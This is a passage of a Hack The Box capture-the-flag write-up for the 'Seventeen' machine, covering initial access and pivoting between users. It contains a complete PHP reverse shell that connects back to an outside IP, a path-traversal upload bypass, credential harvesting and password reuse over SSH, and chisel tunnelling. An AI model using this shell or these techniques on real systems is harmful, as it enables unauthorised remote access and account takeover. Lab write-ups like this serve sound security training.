| 6  | 2    | ../oldmanagement/files/avatar.png | Anthony  | 48bb86d036bb993dfdcf7fefdc60cc06 | UndetectableMark | Mark         | 2021-09-30 16:34:02 | NULL       | 2022-05-10 08:21:39 |
| 7  | 2    | ../oldmanagement/files/avatar.png | Smith    | 184fe92824bea12486ae9a56050228ee | Stev1992         | Steven       | 2022-02-22 21:05:07 | NULL       | 2022-02-24 22:00:24 |
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
```

After some manual testing i've found an endpoint that was not discovered via directory bruteforcing:

http://seventeen.htb:8000/oldmanagement/

### Port 8000 oldmanagement

Located at http://seventeen.htb:8000/oldmanagement/

The login form expects a ```Student No.```, so this is the one we cracked previously.



| user_no | Name  | password  |
|---|---|---|
| 31234  | Kelly Shane  | autodestruction  |


After logging in we can download the ```PDF``` we discovered previously via the DB dump.
From the PDF we gain some useful information:


```
Dear Kelly,
 Hello!Congratulationsonthe good grades. Your hard workhas paidoff! But Ido want to point out that you are lacking marks
inScience. Allthe other subjects are perfectlyfineand acceptable.But you do have to workonyourknowledge inScience
related areas.
Mr. Sam, your science teacher has mentioned to me that you are lacking inthe Physics sectionspecifically. Sowe thought
maybe we could workonthose skills by organizing some extraclasses. Some other colleagues of yours have alreadyagreed to this and
are willing to attend the studysessions at night.
Pleaselet Mr. Sam know the exact time when you can participate inthe sessions. And he wanted you to know that he won't be active
thorough the socials these days.You can useour new webmail service instead. (https://mastermailer.seventeen.htb/)
Original resource by Seventeen TLC
Thanks,
Mr.StevenBanks
TIC
Also, your requestto add the pastpapers to the file management applicationwas acknowledgedby the server management staff.
They informedthat those were stored and will be available for you to download shortly
```
https://mastermailer.seventeen.htb/

Lets add the subdomain to our hosts:
```
┌──(luca㉿kali)-[~]
└─$ cat /etc/hosts                                                                                                      
127.0.0.1       localhost
127.0.1.1       kali
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.11.165    mastermailer.seventeen.htb exam.seventeen.htb seventeen.htb
```

It hosts the ```roundcube``` application, lets dump the database:
[I forgot to document this step, but it was a rabbit hole anyways]
Nothing useful, the hash does not seem crackable.

### Webshell

Lets go back to the ```File Management Application```, there is a upload function -  maybe we can upload a php revserse shell.

I've created a ```php reverse shell``` and lets start some testing:
```
┌──(luca㉿kali)-[~/ctf/htb/seventeen/serve]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
                                                                                                                                                            
┌──(luca㉿kali)-[~/ctf/htb/seventeen/serve]
└─$ mv php-reverse-shell.php shell.php
```
First ```dirbust``` the application: 
```
┌──(luca㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -k -u http://seventeen.htb:8000/oldmanagement/  -e -s 200

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://seventeen.htb:8000/oldmanagement/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/07/20 13:12:52 Starting gobuster in directory enumeration mode
===============================================================
http://seventeen.htb:8000/oldmanagement/files                (Status: 301) [Size: 335] [--> http://seventeen.htb:8000/oldmanagement/files/]
http://seventeen.htb:8000/oldmanagement/admin                (Status: 301) [Size: 335] [--> http://seventeen.htb:8000/oldmanagement/admin/]
http://seventeen.htb:8000/oldmanagement/db                   (Status: 403) [Size: 280]                                                     
                                                                                                                                           
===============================================================
2022/07/20 13:22:01 Finished
===============================================================
```
We found ```/files``` 

Dirbusting /files did not get us any additional directorys.

Lets upload a demo file and intercept the request with burp.
```
POST /oldmanagement/save_file.php HTTP/1.1
Host: seventeen.htb:8000
Content-Length: 382
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://seventeen.htb:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCfaZTEadbHNAVxAO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://seventeen.htb:8000/oldmanagement/student_profile.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=c73883b618026b87686ef5ed69bf6509
Connection: close

------WebKitFormBoundaryCfaZTEadbHNAVxAO
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

foobar

------WebKitFormBoundaryCfaZTEadbHNAVxAO
Content-Disposition: form-data; name="stud_no"

31234
------WebKitFormBoundaryCfaZTEadbHNAVxAO
Content-Disposition: form-data; name="save"


------WebKitFormBoundaryCfaZTEadbHNAVxAO--
```

Okay so we could try to modify the ```filename``` and the ```stud_no``` parameter for path traversal.

Lets first test if the ```stud_no``` defines the directory the files get saved into.
Browsing to http://seventeen.htb:8000/oldmanagement/files/31234/ confirms that the directory exists.

Is our testfile in there?
**It is!**
```
┌──(luca㉿kali)-[~]
└─$ curl http://seventeen.htb:8000/oldmanagement/files/31234/test.txt  
foobar
```
Lets try to upload the ```php reverse shell``` and try to trigger it.

```
POST /oldmanagement/save_file.php HTTP/1.1
Host: seventeen.htb:8000
Content-Length: 5872
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://seventeen.htb:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoU7e61zJ2uFx22E8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://seventeen.htb:8000/oldmanagement/student_profile.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=c73883b618026b87686ef5ed69bf6509
Connection: close

------WebKitFormBoundaryoU7e61zJ2uFx22E8
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.2';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 




------WebKitFormBoundaryoU7e61zJ2uFx22E8
Content-Disposition: form-data; name="stud_no"

31234
------WebKitFormBoundaryoU7e61zJ2uFx22E8
Content-Disposition: form-data; name="save"


------WebKitFormBoundaryoU7e61zJ2uFx22E8--
```

The file exists in the directory but execution/access is forbidden.

```
┌──(luca㉿kali)-[~]
└─$ curl http://seventeen.htb:8000/oldmanagement/files/31234/shell.php
<h1>Forbidden</h1>                                                                                                                                                            
┌──(luca㉿kali)-[~]
└─$ curl http://seventeen.htb:8000/oldmanagement/files/31234/notmy_shell.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at seventeen.htb Port 8000</address>
</body></html>
```

Lets try some ```path travsersal``` by editing the filename:

```
Content-Disposition: form-data; name="file"; filename="../shell.php"
```

Did not work:

```
┌──(luca㉿kali)-[~]
└─$ curl http://seventeen.htb:8000/oldmanagement/files/shell.php 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at seventeen.htb Port 8000</address>
</body></html>
```

Maybe the folder parameter?
```
------WebKitFormBoundaryoU7e61zJ2uFx22E8
Content-Disposition: form-data; name="stud_no"

31234/..
```

Yea, the path traversal worked! Lets trigger the php file.
```
┌──(luca㉿kali)-[~]
└─$ curl http://seventeen.htb:8000/oldmanagement/files/shell1.php
WARNING: Failed to daemonise.  This is quite common and not fatal.
<br />
<b>Warning</b>:  fsockopen(): unable to connect to 10.10.14.2:4444 (Connection refused) in <b>/var/www/html/oldmanagement/files/shell1.php</b> on line <b>100</b><br />
Connection refused (111)
```

### Enumeration

Catch the shell:
```
┌──(luca㉿kali)-[~]
└─$ /home/luca/.local/bin/pwncat-cs -lp 4444
[13:46:50] Welcome to pwncat 🐈!                                                                                                             __main__.py:164
[13:46:52] received connection from 10.10.11.165:51870                                                                                            bind.py:84
[13:46:52] 0.0.0.0:4444: upgrading from /bin/dash to /bin/bash                                                                                manager.py:957
[13:46:53] 10.10.11.165:51870: registered new host w/ db                                                                                      manager.py:957
(local) pwncat$                                                                                                                                             
(remote) www-data@46abbdbcae32:/$ whoami
www-data
```

Before I'll upload linpeas.sh lets first search for some  DB Credentials.

```
(remote) www-data@46abbdbcae32:/var/www/html/oldmanagement/admin$ cat conn.php 
<?php
        $conn = mysqli_connect("127.0.0.1", "mysqluser", "mysqlpassword", "db_sfms");

        if(!$conn){
                die("Error: Failed to connect to database!");
        }

        $default_query = mysqli_query($conn, "SELECT * FROM `user`") or die(mysqli_error());
        $check_default = mysqli_num_rows($default_query);

        if($check_default === 0){
                $enrypted_password = md5('admin');
                mysqli_query($conn, "INSERT INTO `user` VALUES('', 'Administrator', '', 'admin', '$enrypted_password', 'administrator')") or die(mysqli_error());
                return false;
        }
?>
```
|Username|Passsword|
|---|---|
|mysqluser|mysqlpassword|

```
(remote) www-data@46abbdbcae32:/var/www/html/employeemanagementsystem/process$ cat dbh.php 
<?php

$servername = "localhost";
$dBUsername = "root";
$dbPassword = "2020bestyearofmylife";
$dBName = "ems";

$conn = mysqli_connect($servername, $dBUsername, $dbPassword, $dBName);

if(!$conn){
        echo "Databese Connection Failed";
}

?>
```

|Username|Passsword|
|---|---|
|root|2020bestyearofmylife|

That password is way to ```obvious```, it's probably going to be reused.

Altough we are within a containter ```/etc/passwd``` reveals the user ```mark```

Lets test the credentials.

```
┌──(luca㉿kali)-[~]
└─$ ssh mark@seventeen.htb               
The authenticity of host 'seventeen.htb (10.10.11.165)' can't be established.
ED25519 key fingerprint is SHA256:g48H/Ajb4W/Ct4cyRPBjSfQksMfb0WSo3zZYJlr9jMk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'seventeen.htb' (ED25519) to the list of known hosts.
mark@seventeen.htb's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul 20 10:00:37 UTC 2022

  System load:                    0.85
  Usage of /:                     62.3% of 11.75GB
  Memory usage:                   57%
  Swap usage:                     0%
  Processes:                      361
  Users logged in:                0
  IP address for eth0:            10.10.11.165
  IP address for br-3539a4850ffa: 172.20.0.1
  IP address for docker0:         172.17.0.1
  IP address for br-b3834f770aa3: 172.18.0.1
  IP address for br-cc437cf0c6a8: 172.19.0.1


18 updates can be applied immediately.
12 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Tue May 31 18:03:16 2022 from 10.10.14.23
```
|Username|Passsword|
|---|---|
|mark|2020bestyearofmylife|
#### Additional Note to the intended path:
In the logs within the docker container I've found some error logs containing a pathtraveral dating back way before the box was released. I assume that the box owner tested the payload and did not clean up very well!

```

(remote) www-data@46abbdbcae32:/var/www/html/mastermailer/logs$ cat errors.log 
[08-Apr-2022 17:55:26 +0000]: PHP Error: No plugin class ../../../../../../../../../var/www/html/oldmanagement/files/31234/papers found in /var/www/html/mastermailer/plugins/../../../../../../../../../var/www/html/oldmanagement/files/31234/papers/../../../../../../../../../var/www/html/oldmanagement/files/31234/papers.php in /var/www/html/mastermailer/program/lib/Roundcube/rcube_plugin_api.php on line 188 (GET /mastermailer/)
```
It looked like the php reverse shell was supposed to be triggered by this vulnerability:
https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-12640

I'm very grateful, that I was able to bypass that intended path. Didn't sound like fun.

## Way to root

so ```/etc/passwd``` tells us that there is a user ```kavi``` we might need to pivot to first.

```
mark@seventeen:/opt/app$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
kavi:x:1000:1000:kavi:/home/kavi:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
dovecot:x:112:116:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:113:117:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
mark:x:1001:1001:,,,:/home/mark:/bin/bash
```

We can read a mail for ```kavi```:
```
mark@seventeen:/var/mail$ cat kavi 
To: kavi@seventeen.htb
From: admin@seventeen.htb
Subject: New staff manager application

Hello Kavishka,

Sorry I couldn't reach you sooner. Good job with the design. I loved it. 

I think Mr. Johnson already told you about our new staff management system. Since our old one had some problems, they are hoping maybe we could migrate to a more modern one. For the first phase, he asked us just a simple web UI to store the details of the staff members.

I have already done some server-side for you. Even though, I did come across some problems with our private registry. However as we agreed, I removed our old logger and added loglevel instead. You just have to publish it to our registry and test it with the application. 

Cheers,
Mike
```
So there is some ```application``` running with a ```private registry``` hosting the  ```loglevel package```.

Did some research on local npm ```registries``` and found this blogpost:

https://blog.bitsrc.io/how-to-set-up-a-private-npm-registry-locally-1065e6790796

I've curled the port and that confirmed that a local ```verdaggio``` service is running on the machine:
```c
mark@seventeen:/var/mail$ curl localhost:4873

    <!DOCTYPE html>
      <html lang="en-us"> 
      <head>
        <meta charset="utf-8">
        <base href="http://localhost:4873/">
        <title>Verdaccio</title>        
        <link rel="icon" href="http://localhost:4873/-/static/favicon.ico"/>
        <meta name="viewport" content="width=device-width, initial-scale=1" /> 
        <script>
            window.__VERDACCIO_BASENAME_UI_OPTIONS={"darkMode":false,"basename":"/","base":"http://localhost:4873/","primaryColor":"#4b5e40","version":"5.6.0","pkgManagers":["yarn","pnpm","npm"],"login":true,"logo":"","title":"Verdaccio","scope":"","language":"es-US"}
        </script>
        
      </head>    
      <body class="body">
      
        <div id="root"></div>
        <script defer="defer" src="http://localhost:4873/-/static/runtime.06493eae2f534100706f.js"></script><script defer="defer" src="http://localhost:4873/-/static/vendors.06493eae2f534100706f.js"></script><script defer="defer" src="http://localhost:4873/-/static/main.06493eae2f534100706f.js"></script>
        
      </body>
    </html>
```

Chisel Server:
```
┌──(luca㉿kali)-[~/ctf/htb/seventeen/serve]
└─$ ./chisel server -p 8083 --reverse
2022/07/20 17:14:52 server: Reverse tunnelling enabled
2022/07/20 17:14:52 server: Fingerprint aBq4cfxSuWzyr0gHl7cvrbptBXs5r4bLruCbCnEv/88=
2022/07/20 17:14:52 server: Listening on http://0.0.0.0:8083
2022/07/20 17:16:20 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Chisel Client:
```
mark@seventeen:~$ ./chisel client 10.10.14.2:8083 R:1080:socks
2022/07/20 13:14:03 client: Connecting to ws://10.10.14.2:8083
2022/07/20 13:14:03 client: Connected (Latency 23.66274ms)
```

I've setup ```proxychains``` with ```FoxyProxy``` in Firefox an browsed to http://localhost:4873/

The Website tells me to do the following:
```
No Package Published Yet.
To publish your first package just:
1. Login
npm adduser --registry http://localhost:4873/
2. Publish
npm publish --registry http://localhost:4873/
3. Refresh this page
```

Seems like we first need to pivot to kavi:
```
mark@seventeen:~$ npm adduser --registry http://localhost:4873/
Username: yeeb
Password: 
Email: (this IS public) yeeb@yeeb.xyz
npm ERR! Linux 4.15.0-177-generic
npm ERR! argv "/usr/bin/node" "/usr/bin/npm" "adduser" "--registry" "http://localhost:4873/"
npm ERR! node v8.10.0
npm ERR! npm  v3.5.2
npm ERR! code E409

npm ERR! user registration disabled : -/user/org.couchdb.user:yeeb/-rev/undefined
npm ERR! 
npm ERR! If you need help, you may report this error at:
npm ERR!     <https://github.com/npm/npm/issues>

npm ERR! Please include the following file with any support request:
npm ERR!     /home/mark/npm-debug.log
```
```Kavi``` is part of the ```plugdev``` group, that might confirms the pivot:
```
mark@seventeen:~$ ls -la /etc/group*
-rw-r--r-- 1 root root 762 May 11 13:26 /etc/group
-rw-r--r-- 1 root root 766 May 11 13:26 /etc/group-
mark@seventeen:~$ diff /etc/group /etc/group-
35c35
< plugdev:x:46:
---
> plugdev:x:46:kavi
```

There is a ```node.js``` application and a startup script located at ```/opt/app/```
Wierd thing is we can read every subdirectory expect the ```db_logger``` one:

```
mark@seventeen:/opt/app$ ls -la
total 24
drwxr-xr-x  3 root root 4096 May 29 14:01 .
drwxr-xr-x  4 root root 4096 Mar 14 19:19 ..
-rwxr-xr-x  1 root root  158 Mar 13 17:26 index.html
-rwxr-xr-x  1 root root  781 Mar 15 19:58 index.js
drwxr-xr-x 14 root root 4096 May 10 17:45 node_modules
-rwxr-xr-x  1 root root  465 May 29 14:01 startup.sh
mark@seventeen:/opt/app$ cd node_modules/
mark@seventeen:/opt/app/node_modules$ ll
total 56
drwxr-xr-x 14 root root 4096 May 10 17:45 ./
drwxr-xr-x  3 root root 4096 May 29 14:01 ../
drwxr-xr-x  3 root root 4096 May 10 16:52 bignumber.js/
drwxr-xr-x  3 root root 4096 May 10 16:52 core-util-is/
drwxr-x---  2 root root 4096 May 10 17:44 db-logger/
drwxr-xr-x  2 root root 4096 May 10 16:52 inherits/
drwxr-xr-x  2 root root 4096 May 10 16:52 isarray/
drwxr-xr-x  3 root root 4096 May 10 16:52 mysql/
drwxr-xr-x  2 root root 4096 May 10 16:52 process-nextick-args/
drwxr-xr-x  4 root root 4096 May 10 16:52 readable-stream/
drwxr-xr-x  2 root root 4096 May 10 16:52 safe-buffer/
drwxr-xr-x  3 root root 4096 May 10 16:52 sqlstring/
drwxr-xr-x  3 root root 4096 May 10 16:52 string_decoder/
drwxr-xr-x  2 root root 4096 May 10 16:52 util-deprecate/
```

### Verdaccio

With the portforward of ```Verdaggio``` still running, I've tested around with the webserver.

Testing any directory/endpoint in the URL gives back a ```json``` output like this:
```
┌──(luca㉿kali)-[~/ctf/htb/seventeen/loot]
└─$ proxychains4 -q curl http://localhost:4873/test
{
  "error": "no such package available"
}
```

```No such package available```? Lets take a look back on the email that we found and also that weird directory permissions on the node module located at 
```
mark@seventeen:/opt/app/node_modules$ ls -la 
total 56                                                                                                                                                    
drwxr-xr-x 14 root root 4096 May 10 17:45 .                                                                                                                 
drwxr-xr-x  3 root root 4096 May 29 14:01 ..                                                                                                                
drwxr-xr-x  3 root root 4096 May 10 16:52 bignumber.js                                                                                                      
drwxr-xr-x  3 root root 4096 May 10 16:52 core-util-is                                                                                                      
drwxr-x---  2 root root 4096 May 10 17:44 db-logger
```

Lets Curl for that specific package.
```
┌──(luca㉿kali)-[~/ctf/htb/seventeen/loot]
└─$ proxychains4 -q curl http://localhost:4873/db-logger
{
  "name": "db-logger",
  "versions": {
    "1.0.1": {
      "name": "db-logger",
      "version": "1.0.1",
      "description": "Log data to a database",
      "main": "logger.js",
      "dependencies": {
        "mysql": "2.18.1"
      },
      "scripts": {
        "test": "echo \"Error: no test specified\" && exit 1"
      },
      "keywords": [
        "log"
      ],
      "author": {
        "name": "kavigihan"
      },
      "license": "ISC",
      "_id": "db-logger@1.0.1",
      "_shasum": "cad3ace58207506616e098c622f50a0ba22ba6d0",
      "_from": ".",
      "_npmVersion": "3.5.2",
      "_nodeVersion": "8.10.0",
      "_npmUser": {},
      "dist": {
        "shasum": "cad3ace58207506616e098c622f50a0ba22ba6d0",
        "tarball": "http://localhost:4873/db-logger/-/db-logger-1.0.1.tgz"
      },
      "contributors": []
    }
  },
  "time": {
    "modified": "2022-03-15T20:41:02.319Z",
    "created": "2022-03-15T20:41:02.319Z",
    "1.0.1": "2022-03-15T20:41:02.319Z"
  },
  "users": {},
  "dist-tags": {
    "latest": "1.0.1"
  },
  "_rev": "3-4e5e31d3d21d9044",
  "_id": "db-logger",
  "readme": "ERROR: No README data found!",
  "_attachments": {}
}
```

Oh yeah we can download the package from http://localhost:4873/db-logger/-/db-logger-1.0.1.tgz 
Let's examine it.
```
┌──(luca㉿kali)-[~/ctf/htb/seventeen/loot]
└─$ proxychains4 -q wget http://localhost:4873/db-logger/-/db-logger-1.0.1.tgz                                                                          4 ⨯
--2022-07-21 19:04:01--  http://localhost:4873/db-logger/-/db-logger-1.0.1.tgz
Resolving localhost (localhost)... ::1, 127.0.0.1
Connecting to localhost (localhost)|::1|:4873... failed: Connection refused.
Connecting to localhost (localhost)|127.0.0.1|:4873... connected.
HTTP request sent, awaiting response... 200 OK
Length: 596 [application/octet-stream]
Saving to: ‘db-logger-1.0.1.tgz’

db-logger-1.0.1.tgz                    100%[============================================================================>]     596  --.-KB/s    in 0s      

2022-07-21 19:04:01 (40.3 MB/s) - ‘db-logger-1.0.1.tgz’ saved [596/596]

                                                                                                                                                            
┌──(luca㉿kali)-[~/ctf/htb/seventeen/loot]
└─$ tar -xf db-logger-1.0.1.tgz  
```

New DB Creds within the js file
```
┌──(luca㉿kali)-[~/…/htb/seventeen/loot/package]
└─$ cat logger.js 
var mysql = require('mysql');

var con = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "IhateMathematics123#",
  database: "logger"
});

function log(msg) {
    con.connect(function(err) {
        if (err) throw err;
        var date = Date();
        var sql = `INSERT INTO logs (time, msg) VALUES (${date}, ${msg});`;
        con.query(sql, function (err, result) {
        if (err) throw err;
        console.log("[+] Logged");
        });
    });
};

module.exports.log = log
```
| Username | Password|
|---|---|
|root|IhateMathematics123#|


Lets check for password reuse on the ```kavi``` account

Success!
```
┌──(luca㉿kali)-[~/…/htb/seventeen/loot/package]
└─$ ssh kavi@seventeen.htb                                                                                                                            255 ⨯
kavi@seventeen.htb's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jul 21 15:05:57 UTC 2022

  System load:                    0.0
  Usage of /:                     63.3% of 11.75GB
  Memory usage:                   71%
  Swap usage:                     0%
  Processes:                      366
  Users logged in:                1
  IP address for eth0:            10.10.11.165
  IP address for br-3539a4850ffa: 172.20.0.1
  IP address for docker0:         172.17.0.1
  IP address for br-b3834f770aa3: 172.18.0.1
  IP address for br-cc437cf0c6a8: 172.19.0.1


18 updates can be applied immediately.
12 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


You have mail.
kavi@seventeen:~$ 
```
| Username | Password|
|---|---|
|kavi|IhateMathematics123#|
### Privilege Escalation


```sudo -l``` confirms that we need to leverage the ```node.js``` application for privilege escalation.


```
kavi@seventeen:~$ sudo -l
Matching Defaults entries for kavi on seventeen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kavi may run the following commands on seventeen:
    (ALL) /opt/app/startup.sh
```

So okay, running the script installs ```loglevel``` from ```verdaccio``` and then runs the application. 

I'm pretty sure, that we need to ```hijack``` the package, lets figure out how.
```
kavi@seventeen:~$ sudo /opt/app/startup.sh 
[=] Checking for db-logger
[+] db-logger already installed
